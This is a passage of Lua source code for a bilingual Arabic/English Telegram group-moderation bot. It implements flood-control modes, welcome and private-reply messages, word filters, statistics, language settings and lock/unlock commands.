Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ قم بتحديد تكرار اكبر من 2 ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Flood sensitivity change to '..floodmax[2]..' ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🚏┇ تم تحديد التكرار للعدد '..floodmax[2]..' في المجموعه ✅', 1, 'md')
end
DevAbs:set(DevProx..'flood:max:'..msg.chat_id_,floodmax[2])
end
end
------------------------------------DevProx-----------------------------------------------------------
local text = msg.content_.text_:gsub('ضع التكرار','Setstatus')
if text:match("^[Ss]etstatus (.*)$") then
local status = {string.match(text, "^([Ss]etstatus) (.*)$")}
if status[2] == "kick" or status[2] == "بالطرد" then
if DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == "Kicked" then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ Flood status is *already* on Kicked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم وضع التكرار بالطرد فعلا 🚏', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Flood status change to *Kicking* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم وضع التكرار بالطرد 🚏', 1, 'md')
end
DevAbs:set(DevProx..'floodstatus'..msg.chat_id_,'Kicked')
end
end
if status[2] == "del" or status[2] == "بالحذف" then
if DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == "DelMsg" then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Flood status is *already* on Deleting ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم وضع التكرار بالحذف فعلا🚏', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Flood status has been change to *Deleting* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم وضع التكرار بالحذف 🚏', 1, 'md')
end
DevAbs:set(DevProx..'floodstatus'..msg.chat_id_,'DelMsg')
end
end
end
---------------------------------------DevProx--------------------------------------------------------
if (text and text == 'enable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Enable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get('DevProx:id:photo'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Get id status is *already* on Photo ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم وضع الايدي بالصوره فعلا ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Get ID status has been changed to *Photo* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم وضع الايدي بالصوره ', 1, 'md')
DevAbs:del('DevProx:id:photo'..msg.chat_id_)
end end end
if (text and text == 'disable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Disable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بدون صوره') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get('DevProx:id:photo'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Get ID status is *already* on Simple ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم وضع الايدي بدون صوره فعلا ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Get ID status has been change to *Simple* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم وضع الايدي بدون صوره ', 1, 'md')
DevAbs:set('DevProx:id:photo'..msg.chat_id_,true)
end end end
if (text and text == 'enable id') and is_owner(msg.sender_user_id_, msg.chat_id_)  or (text and text == 'Enable Id') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تفعيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get('DevProx:id:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ID is already enabled  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ الايدي بالفعل تم تفعيله  ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ID has been enable  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تفعيل الايدي  ', 1, 'md')
DevAbs:del('DevProx:id:mute'..msg.chat_id_)
end end end
if (text and text == 'disable id') and is_owner(msg.sender_user_id_, msg.chat_id_)  or (text and text == 'Disable Id') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تعطيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get('DevProx:id:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ID is already disabled  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ الايدي بالفعل تم تعطيله  ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ID has been disable  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعطيل الايدي  ', 1, 'md')
DevAbs:set('DevProx:id:mute'..msg.chat_id_,true)
end end end
-------------------------------------DevProx----------------------------------------------------------
if is_sudo(msg) then
local text = msg.content_.text_:gsub('المغادره التلقائيه','Autoleave')
if text:match("^[Aa]utoleave (.*)$") then
local status = {string.match(text, "^([Aa]utoleave) (.*)$")}
if status[2] == "تفعيل" or status[2] == "on" then
if DevAbs:get(DevProx..'autoleave') == "On" then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Auto Leave is now active ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تفعيل المغادره التلقائيه فعلا ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Auto Leave has been actived ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تفعيل المغادره التلقائيه ', 1, 'md')
end
DevAbs:set(DevProx..'autoleave','On')
end
end
if status[2] == "تعطيل" or status[2] == "off" then
if DevAbs:get(DevProx..'autoleave') == "Off" then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Auto Leave is now deactive ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعطيل المغادره التلقائيه فعلا ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Auto leave has been deactived ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعطيل المغادره التلقائيه ', 1, 'md')
end
DevAbs:set(DevProx..'autoleave','Off')
end
end
end
---------------------------------DevProx--------------------------------------------------------------
local text = msg.content_.text_:gsub('رد الخاص','Clerk')
if text:match("^[Cc]lerk (.*)$") then
local status = {string.match(text, "^([Cc]lerk) (.*)$")}
if status[2] == "تفعيل" or status[2] == "on" then
if DevAbs:get(DevProx..'clerk') == "On" then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Clerk is now active ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تفعيل رد خاص البوت فعلا ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Clerk has been actived ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تفعيل رد خاص البوت ', 1, 'md')
end
DevAbs:set(DevProx..'clerk','On')
end
end
if status[2] == "تعطيل" or status[2] == "off" then
if DevAbs:get(DevProx..'clerk') == "Off" then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Clerk is now deactive ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعطيل رد الخاص فعلا ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Auto leave has been deactived ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعطيل رد خاص البوت ', 1, 'md')
end
DevAbs:set(DevProx..'clerk','Off')
end
end
end
end
---------------------------------------------DevProx--------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etlink$") or text:match("^ضع رابط$")  then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Plese send your group link now :', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ارسل رابط المجموعه ليتم حفضه 📥 ', 1, 'md')
end
DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_, 'waiting')
end
------------------------------------DevProx-----------------------------------------------------------
if text:match("^الدعم$") or text:match("^المطور$") then
local link = DevAbs:get(DevProx.."bot:supports:link")
if link then
if link:match("https://") then
if DevAbs:get(DevProx.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ <b>Support Link</b> :\n\n " .. link, 1, "html")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🛎┇ تم ارسال بياناتك للمطور \n🏆┇ عند رؤية الرسالة سيأتي\n⏱┇ يمكنك طلب المساعدة من كروب الدعم \n📤┇ رابط كروب دعم البوت \n➖➖➖➖➖➖➖➖\n " .. link, 1, "html")
end
elseif DevAbs:get(DevProx.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ <b>Support Bot ID</b> : @" .. link, 1, "html")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🛎┇ تم ارسال بياناتك للمطور \n🏆┇ عند رؤية الرسالة سيأتي\n⏱┇ يمكنك طلب المساعدة من كروب الدعم \n📤┇ بوت تواصل المطور \n➖➖➖➖➖➖➖➖\n @" .. link, 1, "html")
end
elseif DevAbs:get(DevProx.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ *Support link* is not found ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لم يتم تعيين دعم ارسل لي (ضع دعم) واتبع التعليمات ', 1, 'md')
end
end
-------------------------------

----------------------------------------DevProx-------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ww]elcome on$") or text:match("^تفعيل الترحيب$") then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, ' 📤┇  Welcome activated  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تفعيل الترحيب ', 1, 'md')
end
DevAbs:set(DevProx.."bot:welcome"..msg.chat_id_,true)
end
if text:match("^[Ww]elcome off$") or text:match("^تعطيل الترحيب$") then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Welcome deactivated ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعطيل الترحيب ', 1, 'md')
end
DevAbs:del(DevProx.."bot:welcome"..msg.chat_id_)
end
if text:match("^ضع ترحيب (.*)$")  then
local welcome = {string.match(text, "^(ضع ترحيب) (.*)$")}
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Welcome text has been saved \n\n📤┇  Welcome text :\n\n'..welcome[2], 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم حفض الترحيب \n\n📤┇ الترحيب هو  :\n\n'..welcome[2], 1, 'md')
end
DevAbs:set(DevProx..'welcome:'..msg.chat_id_,welcome[2])
end
if text:match("^[Dd]el welcome$") or text:match("^حذف الترحيب$") then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Welcome text has been removed ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم حذف الترحيب ', 1, 'md')
end
DevAbs:del(DevProx..'welcome:'..msg.chat_id_)
end
if text:match("^[Gg]et welcome$") or text:match("^جلب الترحيب$") then
local wel = DevAbs:get(DevProx..'welcome:'..msg.chat_id_)
if wel then
Dev_Abs(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Welcome text not found ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لم يتم وضع الترحيب ', 1, 'md')
end
end
end
end
--------------------------------------------DevProx---------------------------------------------------
if is_sudo(msg) then
local text = msg.content_.text_:gsub('ضع رد الخاص','Set clerk')
if text:match("^[Ss]et clerk (.*)$") then
local clerk = {string.match(text, "^([Ss]et clerk) (.*)$")}
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Clerk text has been saved \n🎖┇ Welcome text :\n\n'..clerk[2], 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعيين رد الخاص للبوت \n\n📤┇ رد خاص البوت هو :\n\n'..clerk[2], 1, 'md')
end
DevAbs:set(DevProx..'textsec',clerk[2])
end
if text:match("^[Dd]el clerk$") or text:match("^حذف رد الخاص$") then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Clerk text has been removed ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم حذف رد الخاص ',1, 'md')
end
DevAbs:del(DevProx..'textsec')
end
if text:match("^[Gg]et clerk$") or text:match("^جلب رد الخاص$") then
local cel = DevAbs:get(DevProx..'textsec')
if cel then
Dev_Abs(msg.chat_id_, msg.id_, 1, cel, 1, 'md')
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Clerk text not found ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لم يتم وضع رد للخاص ارسل (ضع رد الخاص) ليتم حفظه 📥', 1, 'md')
end
end
end
end
-------------------------------------DevProx----------------------------------------------------------
if text:match("^[Aa]ction (.*)$") and is_sudo(msg) then
local lockpt = {string.match(text, "^([Aa]ction) (.*)$")}
if lockpt[2] == "typing" then
sendaction(msg.chat_id_, 'Typing')
end
if lockpt[2] == "video" then
sendaction(msg.chat_id_, 'RecordVideo')
end
if lockpt[2] == "voice" then
sendaction(msg.chat_id_, 'RecordVoice')
end
if lockpt[2] == "photo" then
sendaction(msg.chat_id_, 'UploadPhoto')
end
end
------------------------------------DevProx-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ff]ilter (.*)$") or text:match("^منع (.*)$") then
local filters = {string.match(text, "^([Ff]ilter) (.*)$")}
local filterss = {string.match(text, "^(منع) (.*)$")}
local name = string.sub(filters[2] or filterss[2], 1, 50)
local abs = (DevProx..'bot:filters:'..msg.chat_id_)
DevAbs:hset(abs, name,'newword')
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇  Word [ "..name.." ] has been filtered ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🔖┇ الكلمه [ "..name.." ]\n🔊┇ تم منعها ✅", 1, 'md')
end
end
end
--------------------------------------DevProx---------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nfilter (.*)$") or text:match("^الغاء منع (.*)$") then
local rws = {string.match(text, "^([Uu]nfilter) (.*)$")}
local rwss = {string.match(text, "^(الغاء منع) (.*)$")}
local name = string.sub(rws[2] or rwss[2], 1, 50)
local cti = msg.chat_id_
local abs = (DevProx..'bot:filters:'..msg.chat_id_)
if not DevAbs:hget(DevProx..abs, name) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ Word : ["..name.."] is not in filterlist ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🔖┇ الكلمه [ "..name.." ]\n📤┇ هي غير ممنوعه في المجموعه ✅", 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ Word : ["..name.."] removed from filterlist ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⏱┇ الكلمه [ "..name.." ]\n🔊┇ تم الغاء منعها ✅", 1, 'md')
end
DevAbs:hdel(abs, name)
end
end
end
------------------------------------DevProx-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ff]ilteer all (.*)$") or text:match("^فلتر عام (.*)$") then
local filters = {string.match(text, "^([Ff]Filteer all) (.*)$")}
local filterss = {string.match(text, "^(فلتر عام) (.*)$")}
local name = string.sub(filters[2] or filterss[2], 1, 50)
local abs = (DevProx..'bot:freewords:')
DevAbs:hset(abs, name,'newword')
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ Word [ "..name.." ]\n🎖┇ has been filtered all ☑️", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "??┇ الكلمه [ "..name.." ]\n📤┇ تم منعها عام ☑️", 1, 'html')
end
end
end
--------------------------------------DevProx---------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nfilter all (.*)$") or text:match("^الغاء منع عام (.*)$") then
local rws = {string.match(text, "^([Uu]nfilter all) (.*)$")}
local rwss = {string.match(text, "^(الغاء منع عام) (.*)$")}
local name = string.sub(rws[2] or rwss[2], 1, 50)
local cti = msg.chat_id_
local abs = (DevProx..'bot:freewords:')
if not DevAbs:hget(abs, name)then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ Word [ "..name.." ]\n📤┇ is not in filtered all ☑️", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ الكلمه [ "..name.." ]\n📤┇ هي ليست ممنوعه عام ☑️", 1, 'html')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ Word [ "..name.." ]\n📤┇ removed from filtered all ☑️", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ الكلمه [ "..name.." ]\n📤┇ تم الغاء منعها عام ☑️", 1, 'html')
end
DevAbs:hdel(abs, name)
end
end
end
---------------------------------------------DevProx--------------------------------------------------

------------------------------------DevProx-----------------------------------------------------------
if text:match("^[Ss]tats$") or text:match("^الاحصائيات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
local gps = DevAbs:scard(DevProx.."bot:groups")
local users = DevAbs:scard(DevProx.."bot:userss")
local allmgs = DevAbs:get(DevProx.."bot:allmsgs")
if DevAbs:get(DevProx..'autoleave') == "On" then
autoleaveen = "Active"
autoleavear = "مفعل 🌟"
elseif DevAbs:get(DevProx..'autoleave') == "Off" then
autoleaveen = "Deactive"
autoleavear = "معطل 🛢"
elseif not DevAbs:get(DevProx..'autoleave') then
autoleaveen = "Deactive"
autoleavear = "معطل 🛢"
end
if DevAbs:get(DevProx..'clerk') == "On" then
clerken = "Active"
clerkar = "مفعل 🌟"
elseif DevAbs:get(DevProx..'clerk') == "Off" then
clerken = "Deactive"
clerkar = "معطل 🛢"
elseif not DevAbs:get(DevProx..'clerk') then
clerken = "Deactive"
clerkar = "معطل 🛢"
end
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Status 🗂 \n\n🎖┇ Groups  '..gps..'\n\n👥┇ Users  '..users..' \n\n📬┇ Msg received  '..allmgs..'\n\n🎙┇ Auto Leave  '..autoleavear..'\n\n💢┇ Clerk  '..clerkar, 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ احصائيات البوت 🗂 \n🚸┇ عدد الكروبات  '..gps..'\n🏆┇ عدد الاعضاء  '..users..' \n📨┇ عدد كل رسائل المجموعات  '..allmgs..'\n♻️┇ المغادره التلقائيه  '..autoleavear..'\n🛎┇ رد الخاص  '..clerkar, 1, 'md')
end
end
---------------------------------------DevProx---------------------------------------
if text:match("^[Rr]esgp$") or text:match("^تنظيف الكروبات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Nubmper of groups bot has been update ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تنظيف الكروبات الوهميه ', 'md')
end
DevAbs:del(DevProx.."bot:groups")
end
------------------------------------------------------------------------------
if text:match("^[Nn]amegp$") or text:match("^اسم المجموعه$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ اسم المجموعه '..title_name(msg.chat_id_)..'', 1, 'md')
end 

-----------------------------------------------------------------------------------------------
if text:match("^[Rr]esmsg$") or text:match("^تنظيف الرسائل$") and is_sudo(msg) then
DevAbs:del(DevProx.."bot:allmsgs")
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ All msg received has been reset ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تنظيف عدد رسائل الكروبات ', 'md')
end
end
--------------------------------------------DevProx---------------------------------------------------
if text:match("^[Ss]etlang (.*)$") or text:match("^ضع اللغه (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local langs = {string.match(text, "^(.*) (.*)$")}
if langs[2] == "ar" or langs[2] == "العربيه" then
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🖱┇ تم وضع اللغه العربيه مسبقا ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🖱┇ تم وضع اللغه العربيه في المجموعه ', 1, 'md')
DevAbs:del(DevProx..'lang:gp:'..msg.chat_id_)
end
end
if langs[2] == "en" or langs[2] == "الانكليزيه" then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🖱┇ *Language Bot is already English* ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🖱┇ *Language Bot has been changed to English* ', 1, 'md')
DevAbs:set(DevProx..'lang:gp:'..msg.chat_id_,true)
end
end
end
---------------------------------DevProx--------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nlock (.*)$") or text:match("^فتح (.*)$") then
local unlockpt = {string.match(text, "^([Uu]nlock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpt[2] == "edit" or unlockpts[2] == "التعديل" then
if DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   التعديل  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'editmsg'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  التعديل سابقا ✔️', 1, 'md')
end
end
if unlockpt[2] == "cmd" or unlockpts[2] == "الشارحه" then
if DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) then
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الشارحه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:cmds'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الشارحه سابقا ✔️', 1, 'md')
end
end
if unlockpt[2] == "bots" or unlockpts[2] == "البوتات" then
if DevAbs:get(DevProx..'bot:bots:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock bots ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   البوتات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:bots:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ bots » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح البوتات سابقا ✔️', 1, 'md')
end
end
end
if unlockpt[2] == "bots ban" or unlockpts[2] == "البوتات بالطرد" then
if DevAbs:get(DevProx..'bot:bots:ban'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock bots ban☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   البوتات بالطرد  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 66, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:bots:ban'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ bots is already unlocked ban ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  البوتات بالطرد سابقا ✔️', 1, 'md')
end
end
end
if unlockpt[2] == "bots keed" or unlockpts[2] == "البوتات بالتقييد" then
if DevAbs:get(DevProx..'keed_bots'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock bots keed ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   البوتات بالتقييد  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 68, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'keed_bots'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ bots is already unlocked keed ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  البوتات بالتقييد سابقا ✔️', 1, 'md')
end
end
end
if unlockpt[2] == "flood" or unlockpts[2] == "التكرار" then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
